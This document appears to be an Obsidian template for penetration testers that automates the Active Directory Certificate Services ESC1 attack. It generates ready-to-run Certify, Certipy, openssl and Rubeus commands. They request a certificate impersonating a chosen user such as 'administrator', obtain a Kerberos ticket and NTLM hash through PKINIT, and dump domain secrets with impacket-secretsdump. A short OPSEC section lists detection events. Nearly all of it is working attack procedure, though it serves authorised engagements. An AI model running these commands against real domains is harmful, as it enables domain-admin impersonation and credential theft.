---
# Attack-specific fields
ca_server:
ca_name:
template_name:
target_user:
cert_pem_path: cert.pem
cert_pfx_path: cert.pfx
cert_pfx_password: pass123
cert_b64:
tgt_ticket:
notes:
---

# ADCS ESC1 — Misconfigured Certificate Template

> [!abstract] Attack Summary
> **ESC1**: A certificate template with `ENROLLEE_SUPPLIES_SUBJECT` enabled + `Client Authentication` EKU + low-privileged enrollment rights. Any domain user can request a certificate for any other user (including DA) by supplying an arbitrary SAN, then use that certificate to authenticate as the target via PKINIT.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["DC FQDN",  b?.dc_fqdn  ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
dv.table(["Field", "Value"], [
  ["CA Server FQDN",        `\`INPUT[text:ca_server]\``],
  ["CA Name",               `\`INPUT[text:ca_name]\``],
  ["Template Name",         `\`INPUT[text:template_name]\``],
  ["Target User (impersonate)", `\`INPUT[text:target_user]\``],
  ["Cert PFX Password",     `\`INPUT[text(defaultValue("${p.cert_pfx_password ?? 'pass123'}")):cert_pfx_password]\``],
]);
```

---

## Step 1 — Find Certificate Authorities

**Windows — Certify**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe cas\n```");
```

**Linux — Certipy**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\ncertipy find -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + "\n\n# Or with BloodHound output\ncertipy find -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -bloodhound\n```");
```

CA Server: `INPUT[text:ca_server]` | CA Name: `INPUT[text:ca_name]`

---

## Step 2 — Find Vulnerable Templates (ESC1)

**Windows — Certify**
```dataviewjs
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe find /vulnerable\n\n# Key indicators of ESC1:\n# - msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT\n# - pKIExtendedKeyUsage: Client Authentication\n# - Low-privileged groups in enrollment rights (e.g. Domain Users)\n```");
```

**Linux — Certipy**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\ncertipy find -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -vulnerable -stdout\n```");
```

Vulnerable template: `INPUT[text:template_name]`

---

## Step 3 — Request Certificate for Target User

**Windows — Certify**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain     = b?.domain  ?? "DOMAIN";
const caServer   = p?.ca_server     || "CA_SERVER_FQDN";
const caName     = p?.ca_name       || "CA_NAME";
const template   = p?.template_name || "VulnerableTemplate";
const targetUser = p?.target_user   || "administrator";
const caFull     = caServer + "\\" + caName;
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe request " +
  "/ca:" + caFull + " /template:" + template + " /altname:" + targetUser + "\n\n# Copy the full output (private key + certificate) to cert.pem on Linux\n```");
```

**Linux — Certipy (all-in-one)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain     = b?.domain   ?? "DOMAIN";
const dc_ip      = b?.dc_ip    ?? "DC_IP";
const username   = b?.username ?? "USER";
const password   = b?.password ?? "PASSWORD";
const caServer   = p?.ca_server     || "CA_SERVER";
const template   = p?.template_name || "VulnerableTemplate";
const targetUser = p?.target_user   || "administrator";
dv.paragraph("```bash\ncertipy req -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip +
  " -ca '" + (p?.ca_name || "CA_NAME") + "' -template '" + template + "' -upn '" + targetUser + "@" + domain + "'\n```");
```

---

## Step 4 — Convert Certificate to PFX

> [!info] Certify outputs PEM format. Convert to PFX for use with Rubeus.

```dataviewjs
const p = dv.current();
const certPfxPass = p?.cert_pfx_password || "pass123";
dv.paragraph("```bash\n# Save private key + cert from Certify output to cert.pem\n# Then on Linux/WSL:\nopenssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n# Enter export password: " + certPfxPass + "\n\n# Convert to base64 for Rubeus\ncat cert.pfx | base64 -w 0\n```");
```

Paste base64 cert: `INPUT[text:cert_b64]`

---

## Step 5 — Authenticate with Certificate (PKINIT)

**Windows — Rubeus asktgt**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain ?? "DOMAIN";
const targetUser  = p?.target_user   || "administrator";
const certB64     = p?.cert_b64      || "BASE64_CERT";
const certPass    = p?.cert_pfx_password || "pass123";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt " +
  "/user:" + targetUser + " /certificate:" + certB64 +
  " /password:" + certPass + " /domain:" + domain + " /nowrap\n```");
```

**Linux — Certipy auth**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain     = b?.domain ?? "DOMAIN";
const dc_ip      = b?.dc_ip  ?? "DC_IP";
const targetUser = p?.target_user || "administrator";
dv.paragraph("```bash\n# Certipy handles auth directly\ncertipy auth -pfx '" + targetUser + ".pfx' -domain " + domain + " -dc-ip " + dc_ip + "\n\n# Outputs NTLM hash and TGT\n```");
```

Paste TGT: `INPUT[text:tgt_ticket]`

---

## Step 6 — Access Resources

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain ?? "DOMAIN";
const dc_ip       = b?.dc_ip  ?? "DC_IP";
const targetUser  = p?.target_user || "administrator";
const ticket      = p?.tgt_ticket  || "BASE64_TGT";
const shortDomain = domain.split('.')[0].toUpperCase();

dv.paragraph("```bash\n# Windows: Import TGT\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe createnetonly " +
  "/program:C:\\Windows\\System32\\cmd.exe /domain:" + shortDomain +
  " /username:" + targetUser + " /password:FakePass /ticket:" + ticket + "\n\nsteal_token PID\n\n# Linux: Use NTLM hash from certipy output\nimpacket-secretsdump -hashes :NTLM_HASH " + domain + "/" + targetUser + "@" + dc_ip + "\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - Certificate enrollment generates **Event 4886** (certificate requested) on the CA.
> - **Event 4887** — certificate issued.
> - Certify and certipy both query LDAP for templates — generates LDAP traffic.
> - Look for enrollment where SubjectAlternativeName differs from the requester's identity.

---

## Notes & Results

`INPUT[textarea:notes]`
